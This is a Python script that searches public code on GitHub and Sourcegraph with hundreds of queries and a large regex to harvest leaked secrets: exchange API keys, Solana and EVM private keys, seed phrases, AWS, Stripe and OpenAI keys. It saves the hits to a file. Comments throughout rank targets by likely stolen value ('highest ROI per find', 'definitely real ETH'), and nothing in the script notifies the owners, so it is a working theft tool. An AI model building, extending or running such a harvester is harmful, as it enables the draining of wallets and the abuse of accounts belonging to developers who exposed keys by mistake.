#!/usr/bin/env python3
import requests, json, time, re, os, sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

TOKEN = os.environ.get('GH_TOKEN', '')
if not TOKEN:
    print('ERROR: GH_TOKEN not set', flush=True)
    sys.exit(1)
print('Token loaded.', flush=True)

HEADERS = {
    'Authorization': f'token {TOKEN}',
    'Accept': 'application/vnd.github.v3+json',
}

# ── Sourcegraph streaming search ─────────────────────────────────────────────
# Primary search engine: no GitHub rate limits, inline content (no raw fetch needed)
SG_STREAM = 'https://sourcegraph.com/.api/search/stream'
SG_HEADERS = {'Accept': 'text/event-stream', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0'}

def _gh_dork_to_sg(dork):
    """Convert GitHub dork syntax to Sourcegraph query."""
    lang_map = {
        'ts': 'TypeScript', 'js': 'JavaScript', 'py': 'Python',
        'json': 'JSON', 'yml': 'YAML', 'yaml': 'YAML', 'sh': 'Bash',
        'toml': 'TOML', 'ipynb': 'Jupyter Notebook',
    }
    if dork.startswith('filename:'):
        rest = dork[9:]
        # 'filename:X Y Z' -> file:X Y Z
        parts = rest.split(' ', 1)
        fname = parts[0]
        terms = parts[1] if len(parts) > 1 else ''
        # wildcards: *.yml -> file:\.yml$
        if fname.startswith('*'):
            ext = fname.lstrip('*.')
            fname_re = r'\.' + ext + r'$'
        else:
            fname_re = re.escape(fname)
        return f'file:{fname_re} {terms}'.strip()
    elif dork.startswith('extension:'):
        rest = dork[10:]
        parts = rest.split(' ', 1)
        ext = parts[0]
        terms = parts[1] if len(parts) > 1 else ''
        lang = lang_map.get(ext, '')
        if lang:
            return f'lang:{lang} {terms}'.strip()
        return fr'file:\.{ext}$ {terms}'.strip()
    return dork

def search_sourcegraph(dork, count=500):
    """
    Query Sourcegraph streaming API. Returns list of (repo, path, line) tuples.
    Inline line content means no raw file fetch needed for most patterns.
    """
    sg_q = _gh_dork_to_sg(dork)
    params = {
        'q': f'context:global {sg_q} patternType:standard',
        'v': 'V3',
        'count': str(count),
    }
    results = []
    try:
        r = requests.get(SG_STREAM, headers=SG_HEADERS, params=params,
                         timeout=40, stream=True)
        for raw in r.iter_lines(decode_unicode=True):
            if not raw or not raw.startswith('data:'):
                continue
            ds = raw[5:].strip()
            if not ds or ds == '{}':
                continue
            try:
                d = json.loads(ds)
            except Exception:
                continue
            if isinstance(d, list):
                for item in d:
                    if not isinstance(item, dict) or item.get('type') != 'content':
                        continue
                    repo = item.get('repository', '').replace('github.com/', '', 1)
                    path = item.get('path', '')
                    for lm in item.get('lineMatches', []):
                        results.append((repo, path, lm.get('line', '')))
            elif isinstance(d, dict) and d.get('done'):
                break
    except Exception as e:
        print(f'  SG_err: {e}', flush=True)
    return results
# ─────────────────────────────────────────────────────────────────────────────

KEY_RE = re.compile(
    r'(sk_live_[a-zA-Z0-9]{24,}'
    r'|rk_live_[a-zA-Z0-9]{24,}'
    r'|AIza[0-9A-Za-z\-_]{35}'
    r'|AKIA[0-9A-Z]{16}'
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
    r'|[0-9]{8,10}:[A-Za-z0-9_\-]{35}'
    # Exchange secrets
    r'|(?:BINANCE_SECRET_KEY|BINANCE_API_SECRET|binance_secret)\s*[=:"\s]+([A-Za-z0-9]{40,})'
    r'|(?:BYBIT_API_SECRET|bybit_secret)\s*[=:"\s]+([A-Za-z0-9]{36,})'
    r'|(?:OKX_SECRET_KEY|okx_secret|OKX_API_SECRET)\s*[=:"\s]+([A-Za-z0-9\-]{30,})'
    r'|(?:KUCOIN_API_SECRET|kucoin_secret)\s*[=:"\s]+([a-f0-9\-]{30,})'
    r'|(?:MEXC_SECRET_KEY|mexc_secret)\s*[=:"\s]+([A-Za-z0-9]{30,})'
    # Solana — base58 full keypair (64 bytes = 87-88 chars, base58 charset has no 0/O/I/l)
    r'|(?:SOLANA_PRIVATE_KEY|SOL_PRIVATE_KEY|ANCHOR_WALLET|DEPLOYER_PRIVATE_KEY|PAYER_PRIVATE_KEY'
    r'|OPERATOR_KEY|WALLET_KEYPAIR|SOL_KEYPAIR|SOLANA_KEYPAIR|PRIVATE_KEY_BASE58'
    r'|SOLANA_WALLET|PUMP_WALLET|SNIPER_WALLET|BOT_WALLET)\s*[=:"\s]+([1-9A-HJ-NP-Za-km-z]{87,88})'
    # Solana CLI keypair JSON array — [byte,byte,...x64] — the Solana CLI default format
    r'|"(?:secretKey|privateKey)"\s*:\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    r'|(?:KEYPAIR|WALLET_BYTES)\s*=\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    # Solana TypeScript bot pattern: Keypair.fromSecretKey(Buffer.from([...64...]))
    r'|Keypair\.fromSecretKey\s*\(\s*(?:Buffer\.from|Uint8Array\.from)?\s*\(\s*\[(\d{1,3}(?:,\s*\d{1,3}){63})\]'
    # Solana bs58.decode pattern: Keypair.fromSecretKey(bs58.decode("...87chars..."))
    r'|bs58\.decode\s*\(\s*["\']([1-9A-HJ-NP-Za-km-z]{87,88})["\']\s*\)'
    # EVM private key — 32 bytes hex (Hardhat/Foundry deployer, MEV bots)
    r'|(?:PRIVATE_KEY|DEPLOYER_KEY|ETH_PRIVATE_KEY|WALLET_PRIVATE_KEY'
    r'|DEPLOYER_PRIVATE_KEY|MEV_BOT_KEY|SEARCHER_KEY|FLASHBOT_KEY)\s*[=:"\s]+(0x[a-fA-F0-9]{64})'
    # ethers.js / web3.py direct instantiation with hardcoded key
    r'|new ethers\.Wallet\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    r'|from_key\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    r'|privateKeyToAccount\s*\(\s*["\']?(0x[a-fA-F0-9]{64})["\']?'
    # Raw 32-byte hex private key without 0x prefix (common in older configs)
    r'|(?:PRIVATE_KEY|ETH_KEY)\s*[=:"\']+([a-fA-F0-9]{64})\b'
    # AWS
    r'|(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:"\s]+([A-Za-z0-9/+]{40})'
    # BIP39 mnemonic — 12 or 24 words from the wordlist
    r'|(?:MNEMONIC|mnemonic|SEED_PHRASE|WALLET_MNEMONIC|RECOVERY_PHRASE)\s*[=:"]+\s*'
    r'([a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z]+ [a-z][a-z ]*)'
    # Stripe / Telegram / OpenAI
    r'|(?:STRIPE_SECRET_KEY|STRIPE_LIVE_SECRET)\s*[=:"\s]+(sk_live_[A-Za-z0-9]{24,})'
    r'|(?:OPENAI_API_KEY)\s*[=:"\s]+(sk-[A-Za-z0-9]{32,})'
    r'|(?:TELEGRAM_BOT_TOKEN|BOT_TOKEN)\s*[=:"\s]+([0-9]{8,10}:[A-Za-z0-9_\-]{35})'
    r'|-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----)',
    re.IGNORECASE
)

DORKS = [
    # === EXCHANGE API KEYS — highest probability of real funds ===
    'filename:.env BINANCE_SECRET_KEY',
    'filename:.env BINANCE_API_SECRET',
    'filename:.env BYBIT_API_SECRET',
    'filename:.env OKX_SECRET_KEY',
    'filename:.env KUCOIN_API_SECRET',
    'filename:.env MEXC_SECRET_KEY',
    'filename:.env GATE_API_SECRET',
    'filename:.env KRAKEN_API_PRIVATE_KEY',
    'filename:.env HUOBI_SECRET_KEY',
    'filename:config.json api_secret binance',
    'filename:config.py BINANCE_SECRET',
    'filename:.env API_SECRET exchange',

    # === SOLANA — funded keypairs (highest ROI per find) ===
    # .env patterns — devs building bots commit these constantly
    'filename:.env SOLANA_PRIVATE_KEY',
    'filename:.env SOL_PRIVATE_KEY',
    'filename:.env ANCHOR_WALLET',
    'filename:.env DEPLOYER_PRIVATE_KEY solana',
    'filename:.env PAYER_PRIVATE_KEY',
    'filename:.env WALLET_KEYPAIR',
    'filename:.env SOLANA_KEYPAIR',
    'filename:.env PUMP_WALLET',
    'filename:.env SNIPER_WALLET',
    'filename:.env BOT_WALLET solana',
    'filename:.env OPERATOR_KEY solana',
    # Solana CLI keypair JSON files — id.json / keypair.json contain raw uint8 arrays
    # These are the most common accidental commits
    'filename:id.json secretKey',
    'filename:keypair.json secretKey',
    'filename:wallet.json secretKey',
    'filename:deployer.json secretKey',
    'filename:payer.json secretKey',
    # pump.fun / sniper bots — ALWAYS have funded wallets
    'filename:.env PUMP_FUN PRIVATE_KEY',
    'filename:.env pump WALLET',
    'filename:sniper.ts PRIVATE_KEY',
    'filename:sniper.js PRIVATE_KEY',
    'filename:bot.ts SOLANA PRIVATE_KEY',
    'filename:.env JITO PRIVATE_KEY',
    'filename:.env SOLANA_WALLET PRIVATE_KEY',
    # Anchor/Solana program deployers
    'filename:.env.local SOLANA_PRIVATE_KEY',
    'filename:.env.local ANCHOR_WALLET',
    'filename:Anchor.toml wallet',

    # === EVM PRIVATE KEYS — Hardhat/Foundry deployers, MEV bots ===
    # Hardhat — accounts array or .env PRIVATE_KEY
    'filename:hardhat.config.js PRIVATE_KEY',
    'filename:hardhat.config.ts PRIVATE_KEY',
    'filename:.env PRIVATE_KEY 0x',
    'filename:.env.local PRIVATE_KEY 0x',
    'filename:.env DEPLOYER_PRIVATE_KEY 0x',
    'filename:.env ETH_PRIVATE_KEY',
    'filename:.env WALLET_PRIVATE_KEY',
    # Foundry — .env used with foundry.toml
    'filename:.env FOUNDRY_PRIVATE_KEY',
    'filename:foundry.toml private_key',
    # MEV / flashloan bots — funded by definition
    'filename:.env MEV_BOT_KEY',
    'filename:.env SEARCHER_KEY',
    'filename:.env FLASHBOT_SIGNING_KEY',
    'filename:.env ARB_BOT PRIVATE_KEY',
    'filename:.env LIQUIDATOR_KEY',
    # NFT minting scripts — often mainnet with real ETH
    'filename:.env MINTER_PRIVATE_KEY',
    'filename:deploy.js privateKey 0x',
    'filename:mint.js privateKey',

    # === STRIPE LIVE ===
    'filename:.env STRIPE_SECRET_KEY sk_live',
    'filename:.env sk_live_',
    'filename:.env.production STRIPE',

    # === TELEGRAM payment bots ===
    'filename:.env TELEGRAM_BOT_TOKEN payment',
    'filename:.env BOT_TOKEN STRIPE',
    'filename:bot.py TOKEN STRIPE',

    # === AWS ===
    'filename:.env AWS_SECRET_ACCESS_KEY',
    'filename:.env.production AWS_SECRET',
    'filename:.env.local AWS_SECRET_ACCESS_KEY',

    # === BIP39 MNEMONICS — controls entire wallet tree ===
    'filename:.env MNEMONIC',
    'filename:.env SEED_PHRASE',
    'filename:.env WALLET_MNEMONIC',
    'filename:config.json mnemonic',
    'filename:.env RECOVERY_PHRASE',
    # 12-word mnemonics in trading bot configs
    'filename:config.js mnemonic abandon',
    'filename:.env SECRET_RECOVERY_PHRASE',

    # === REAL MNEMONIC FILES — plaintext backup files, NOT .env.example ===
    # Devs save seed phrases to text files and commit them
    'filename:seed.txt mnemonic',
    'filename:wallet.txt mnemonic',
    'filename:backup.txt mnemonic',
    'filename:keys.txt mnemonic',
    'filename:phrase.txt',
    'filename:recovery.txt',
    'filename:seed_phrase.txt',
    'filename:.env.production MNEMONIC',
    'filename:.env.prod MNEMONIC',
    'filename:.env.prod SEED_PHRASE',
    # Solana wallet files people commit accidentally
    'filename:wallet.json solana mnemonic',
    # Config files (not example)
    'filename:config.yaml mnemonic',
    'filename:config.yml MNEMONIC',
    'filename:settings.py MNEMONIC',
    'filename:.env TRON_MNEMONIC',
    'filename:.env BTC_MNEMONIC',
    # Jupyter notebooks with real mnemonics
    'extension:ipynb SEED_PHRASE',
    'extension:ipynb RECOVERY_PHRASE',

    # === OPENAI ===
    'filename:.env OPENAI_API_KEY',
    'filename:.env.local OPENAI_API_KEY',
    'filename:.env.production OPENAI_API_KEY',

    # === GOOGLE / FIREBASE ===
    'filename:.env GOOGLE_API_KEY AIza',
    'filename:.env FIREBASE_PRIVATE_KEY',

    # === CRYPTO TRADING BOT CONFIGS ===
    'filename:config.json api_key api_secret crypto',
    'filename:.env EXCHANGE_API_SECRET',
    'filename:.env TRADING_BOT_SECRET',

    # === JUPYTER NOTEBOOKS — massive blind spot, no GitHub secret scanning ===
    # Researchers/quant devs test with real keys in notebooks constantly
    'extension:ipynb PRIVATE_KEY',
    'extension:ipynb secretKey solana',
    'extension:ipynb BINANCE_SECRET',
    'extension:ipynb web3 from_key',
    'extension:ipynb MNEMONIC',
    'extension:ipynb aws_secret_access_key',
    'extension:ipynb OPENAI_API_KEY',
    'extension:ipynb Keypair fromSecretKey',
    'extension:ipynb sk_live_',

    # === TERRAFORM STATE — contains every secret used to provision infra ===
    'filename:terraform.tfstate aws_secret_access_key',
    'filename:terraform.tfstate private_key',
    'filename:.tfvars aws_secret_access_key',
    'filename:.tfvars private_key',
    'filename:terraform.tfvars PRIVATE_KEY',

    # === SOLANA CODE PATTERNS — direct key hardcoding in TS/JS bots ===
    # Keypair.fromSecretKey is how every Solana bot initializes its wallet
    'extension:ts Keypair.fromSecretKey Buffer.from',
    'extension:js Keypair.fromSecretKey Buffer.from',
    'extension:ts Keypair.fromSecretKey bs58.decode',
    'extension:js Keypair.fromSecretKey bs58.decode',
    'extension:ts fromSecretKey Uint8Array',
    'extension:js fromSecretKey Uint8Array',
    # Solana web3.js direct array instantiation
    'extension:ts secretKey solana pump',
    'extension:js secretKey solana pump',
    # Anchor workspace wallet
    'extension:ts anchor.Wallet keypair',
    'extension:ts loadKeypair private',

    # === EVM DIRECT CODE PATTERNS — hardcoded in scripts not just .env ===
    'extension:js new ethers.Wallet PRIVATE_KEY',
    'extension:ts new ethers.Wallet PRIVATE_KEY',
    'extension:py from_key 0x',
    'extension:py privateKeyToAccount',
    'extension:js privateKey 0x mainnet',
    'extension:ts privateKey 0x mainnet',
    # cast send (Foundry CLI in scripts)
    'filename:deploy.sh private-key 0x',
    'filename:Makefile cast send private-key',

    # === MAINNET QUALIFIER — private key + mainnet RPC = definitely real ETH ===
    'filename:.env ALCHEMY_MAINNET_URL PRIVATE_KEY',
    'filename:.env INFURA_API_KEY PRIVATE_KEY',
    'filename:.env QUICKNODE_HTTP PRIVATE_KEY',
    'filename:.env MAINNET_PRIVATE_KEY',
    'filename:.env PROD_PRIVATE_KEY',
    'filename:.env MAINNET_URL PRIVATE_KEY',
    'filename:.env.mainnet PRIVATE_KEY',
    'filename:.env ALCHEMY_API_KEY ETH_PRIVATE_KEY',

    # === DOCKER + CI — secrets baked into compose/CI files ===
    'filename:docker-compose.yml PRIVATE_KEY',
    'filename:docker-compose.yml AWS_SECRET',
    'filename:docker-compose.yml BINANCE_SECRET',
    'filename:.env.docker PRIVATE_KEY',
    'filename:docker-compose.yml SOLANA',

    # === PYTHON SCRIPTS — web3.py / solana-py patterns ===
    'extension:py PRIVATE_KEY = "0x',
    'extension:py solana keypair secret',
    'extension:py web3 private_key mainnet',
    'extension:py binance Client api_key',

    # === ADDITIONAL SOLANA BOT PATTERNS ===
    'filename:.env RAYDIUM PRIVATE_KEY',
    'filename:.env JUPITER PRIVATE_KEY',
    'filename:.env DRIFT PRIVATE_KEY',
    'filename:.env MARGINFI PRIVATE_KEY',
    'filename:.env ORCA PRIVATE_KEY',
    # volume bots / market making
    'filename:.env VOLUME_BOT PRIVATE_KEY',
    'filename:.env MARKET_MAKER solana',
    'filename:.env COPY_TRADE PRIVATE_KEY',
    'filename:.env ARBITRAGE solana PRIVATE_KEY',

    # === ADDITIONAL CHAINS — less saturated than ETH/SOL ===
    'filename:.env NEAR_PRIVATE_KEY',
    'filename:.env APTOS_PRIVATE_KEY',
    'filename:.env SUI_PRIVATE_KEY',
    'filename:.env TON_MNEMONIC',
    'filename:.env COSMOS_MNEMONIC',

    # === SHELL SCRIPTS / DOTFILES — ops engineers leak keys here ===
    'filename:.bashrc PRIVATE_KEY',
    'filename:.bash_profile AWS_SECRET',
    'filename:.zshrc PRIVATE_KEY',
    'filename:.zshrc BINANCE',
    'extension:sh export PRIVATE_KEY',
    'extension:sh export AWS_SECRET_ACCESS_KEY',

    # === GITHUB ACTIONS WORKFLOWS — hardcoded instead of using secrets ===
    'filename:*.yml PRIVATE_KEY 0x',
    'filename:*.yaml AWS_SECRET_ACCESS_KEY',
    'filename:*.yml BINANCE_SECRET',

    # === MISSING EXCHANGES — Coinbase, Bittrex, Hyperliquid, dYdX ===
    'filename:.env COINBASE_API_KEY',
    'filename:.env COINBASE_API_SECRET',
    'filename:.env COINBASE_ACCESS_TOKEN',
    'filename:.env BITTREX_API_KEY',
    'filename:.env BITTREX_SECRET',
    'filename:.env DYDX_API_KEY',
    'filename:.env DYDX_STARK_PRIVATE_KEY',
    'filename:.env HYPERLIQUID_PRIVATE_KEY',
    'filename:.env HYPERLIQUID_API_WALLET',
    'filename:.env PHEMEX_API_KEY',
    'filename:.env PHEMEX_API_SECRET',
    'filename:.env BITMEX_API_KEY',
    'filename:.env BITMEX_API_SECRET',
    'filename:.env WHITEBIT_API_KEY',
    'filename:.env GATEIO_API_KEY',
    'filename:.env GATEIO_SECRET_KEY',

    # === PUMP.FUN / BUNDLE / LAUNCH BOT PATTERNS (2024-2025) ===
    'filename:.env BUNDLE_WALLET PRIVATE_KEY',
    'filename:.env LAUNCH_WALLET',
    'filename:.env DEV_WALLET solana',
    'filename:.env CREATOR_WALLET',
    'filename:.env PUMP_PRIVATE_KEY',
    'filename:bundle.ts PRIVATE_KEY',
    'filename:launch.ts PRIVATE_KEY',
    'filename:createToken.ts PRIVATE_KEY',
    'filename:buyToken.ts PRIVATE_KEY',

    # === .env.development / .env.staging — devs forget these aren't gitignored ===
    'filename:.env.development PRIVATE_KEY',
    'filename:.env.staging PRIVATE_KEY',
    'filename:.env.dev PRIVATE_KEY',
    'filename:.env.test PRIVATE_KEY 0x',
    'filename:.env.staging BINANCE',
    'filename:.env.development SOLANA',

    # === CONFIG FILES devs forget are committing secrets ===
    'filename:config.toml private_key',
    'filename:settings.json private_key',
    'filename:appsettings.json ConnectionStrings',
    'filename:application.properties api.secret',
    'filename:.env.local SOLANA_PRIVATE_KEY',

    # === TELEGRAM MINI-APP / TON BOTS — 2024 pattern ===
    'filename:.env TON_MNEMONIC 24',
    'filename:.env TON_PRIVATE_KEY',
    'filename:bot.py TON_WALLET MNEMONIC',
    'filename:.env TONKEEPER_MNEMONIC',

    # === SUI / APTOS — less saturated, more live keys ===
    'filename:.env SUI_PRIVATE_KEY',
    'filename:.env SUI_MNEMONIC',
    'filename:.env APTOS_PRIVATE_KEY',
    'filename:.env APTOS_MNEMONIC',
    'filename:Move.toml private_key',

    # === TRON — still active, TRC20 USDT moves here ===
    'filename:.env TRON_PRIVATE_KEY',
    'filename:.env TRONWEB_PRIVATE_KEY',
    'filename:.env TRON_API_KEY',
    'filename:tron.py private_key',

    # === BROWSER EXTENSION WALLETS exported to files ===
    'filename:phantom.json secretKey',
    'filename:metamask_export.json mnemonic',
    'filename:wallet_export.json mnemonic',
    'filename:keystore password',

    # === NFT MARKETPLACE BOTS (2023-2024) ===
    'filename:.env OPENSEA_API_KEY PRIVATE_KEY',
    'filename:.env BLUR_API_KEY PRIVATE_KEY',
    'filename:nft_bot.py PRIVATE_KEY',
    'filename:mint.ts PRIVATE_KEY mainnet',

    # === CROSS-CHAIN BRIDGE / ARBITRAGE BOTS ===
    'filename:.env CROSS_CHAIN_PRIVATE_KEY',
    'filename:.env BRIDGE_BOT PRIVATE_KEY',
    'filename:.env CHAIN_A_PRIVATE_KEY',
    'filename:.env CHAIN_B_PRIVATE_KEY',
    'filename:arb.ts PRIVATE_KEY rpc',
]

# load seen set
seen = set()
if os.path.exists('seen.txt'):
    for line in open('seen.txt'):
        seen.add(line.strip())
print(f'Seen: {len(seen)} already scanned', flush=True)

def search(query, page=1):
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'per_page': 100, 'page': page}
    r = requests.get(url, headers=HEADERS, params=params, timeout=15)
    if r.status_code == 403:
        reset = int(r.headers.get('X-RateLimit-Reset', time.time() + 60))
        wait = max(reset - time.time(), 5)
        print(f'  rate limit — sleeping {wait:.0f}s', flush=True)
        time.sleep(wait)
        return None
    if r.status_code != 200:
        print(f'  error {r.status_code}: {r.text[:100]}', flush=True)
        return None
    return r.json()

def get_raw(url):
    raw = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
    r = requests.get(raw, headers=HEADERS, timeout=10)
    return r.text[:8000] if r.status_code == 200 else ''

def fetch_and_scan(item):
    html_url = item.get('html_url', '')
    repo = item.get('repository', {}).get('full_name', '')
    path = item.get('path', '')
    try:
        content = get_raw(html_url)
    except:
        content = ''
    secrets = []
    if content:
        secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(content)))
    return html_url, repo, path, secrets

findings = []
new_seen = []
_last_gh_call = 0  # rate-limit pacer for GitHub API

def _gh_search_paced(dork, page):
    """GitHub code search with 2s minimum spacing to stay under 30/min."""
    global _last_gh_call
    gap = time.time() - _last_gh_call
    if gap < 2.0:
        time.sleep(2.0 - gap)
    result = search(dork, page)
    _last_gh_call = time.time()
    return result

for dork in DORKS:
    print(f'\nDORK: {dork}', flush=True)

    # ── Phase 1: Sourcegraph (fast, inline content, no GH rate limit) ──
    sg_lines = search_sourcegraph(dork, count=500)
    print(f'  SG: {len(sg_lines)} line candidates', flush=True)

    sg_new = 0
    raw_needed = []  # items where line content alone wasn't enough
    for repo, path, line in sg_lines:
        key = f'{repo}/{path}'
        if key in seen:
            continue
        seen.add(key)
        new_seen.append(key)
        sg_new += 1

        secrets = list(set(m.group(0)[:200] for m in KEY_RE.finditer(line)))
        if secrets:
            entry = {
                'url': f'https://github.com/{repo}/blob/HEAD/{path}',
                'repo': repo,
                'path': path,
                'secrets': secrets[:10],
                'found_at': datetime.utcnow().isoformat(),
                'source': 'sg',
            }
            findings.append(entry)
            print(f'  HIT(sg): {repo}/{path} — {len(secrets)} secrets', flush=True)
        else:
            # Line has matching keyword but key may be on adjacent line — queue for raw fetch
            if sg_new <= 50:  # cap raw fetches per dork to avoid blowing time budget
                raw_needed.append({
                    'html_url': f'https://github.com/{repo}/blob/HEAD/{path}',
                    'repository': {'full_name': repo},
                    'path': path,
                })

    # parallel raw fetch for items where line content wasn't self-contained
    if raw_needed:
        print(f'  SG raw-fetch fallback: {len(raw_needed)} files', flush=True)
        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {ex.submit(fetch_and_scan, item): item for item in raw_needed}
            for future in as_completed(futures):
                try:
                    html_url, repo, path, secrets = future.result()
                except Exception:
                    continue
                if secrets:
                    entry = {
                        'url': html_url,
                        'repo': repo,
                        'path': path,
                        'secrets': secrets[:10],
                        'found_at': datetime.utcnow().isoformat(),
                        'source': 'sg_raw',
                    }
                    findings.append(entry)
                    print(f'  HIT(sg_raw): {repo}/{path} — {len(secrets)} secrets', flush=True)

    # ── Phase 2: GitHub API (catches repos SG doesn't index; rate-paced) ──
    # Skip GH search if SG already found plenty of candidates for this dork
    if sg_new >= 50:
        print(f'  GH skip (SG returned {sg_new} candidates)', flush=True)
        continue

    for page in range(1, 11):
        result = _gh_search_paced(dork, page)
        if not result:
            break
        items = result.get('items', [])
        total = result.get('total_count', 0)
        if page == 1:
            print(f'  GH: {total} total results', flush=True)
        if not items:
            break

        new_items_list = []
        for item in items:
            repo = item.get('repository', {}).get('full_name', '')
            path = item.get('path', '')
            key = f'{repo}/{path}'
            if key not in seen:
                seen.add(key)
                new_seen.append(key)
                new_items_list.append(item)

        print(f'  GH page {page}: {len(new_items_list)} new', flush=True)

        with ThreadPoolExecutor(max_workers=8) as ex:
            futures = {ex.submit(fetch_and_scan, item): item for item in new_items_list}
            for future in as_completed(futures):
                try:
                    html_url, repo, path, secrets = future.result()
                except Exception:
                    continue
                if secrets:
                    entry = {
                        'url': html_url,
                        'repo': repo,
                        'path': path,
                        'secrets': secrets[:10],
                        'found_at': datetime.utcnow().isoformat(),
                        'source': 'gh',
                    }
                    findings.append(entry)
                    print(f'  HIT(gh): {repo}/{path} — {len(secrets)} secrets', flush=True)

        if len(items) < 100:
            break

print(f'\nTotal hits: {len(findings)}', flush=True)
print(f'New candidates scanned: {len(new_seen)}', flush=True)

with open('gh_findings.jsonl', 'w') as f:
    for r in findings:
        f.write(json.dumps(r) + '\n')

with open('seen.txt', 'a') as f:
    for key in new_seen:
        f.write(key + '\n')

print('Written to gh_findings.jsonl')
